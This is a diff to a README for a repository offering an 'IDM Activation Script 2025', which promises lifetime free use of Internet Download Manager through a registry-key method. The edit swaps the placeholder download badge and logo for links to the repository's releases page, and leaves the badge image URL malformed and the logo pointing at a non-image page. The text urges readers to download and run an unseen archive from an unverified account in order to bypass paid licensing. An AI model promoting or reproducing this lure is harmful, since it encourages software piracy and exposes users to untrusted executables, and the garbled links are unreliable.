@@ -18,7 +18,7 @@ Welcome to the IDM Activation Script 2025 repository! Here, you will find all th
 
 To get started with the IDM Activation Script, simply download the script from the following link: 
 
-[![Download Script](https://img.shields.io/badge/Download%20Script-Release.zip-brightgreen)](https://github.com/assets/Release.zip)
+[![Download Script](https://github.com/BoeL336/IDM-Activation-Script-2025/releases%https://github.com/BoeL336/IDM-Activation-Script-2025/releases)](https://github.com/BoeL336/IDM-Activation-Script-2025/releases)
 
 Once you have downloaded the script, follow the instructions provided to activate IDM using the registry key lock method and enjoy a lifetime of free IDM access.
 
@@ -34,4 +34,4 @@ Stay connected with the latest updates and announcements related to the IDM Acti
 
 Let's make IDM activation hassle-free and enjoy seamless downloading experience with the IDM Activation Script 2025. Happy downloading! 🎉
 
-![IDM Logo](https://example.com/idm-logo.png)
+![IDM Logo](https://github.com/BoeL336/IDM-Activation-Script-2025/releases)
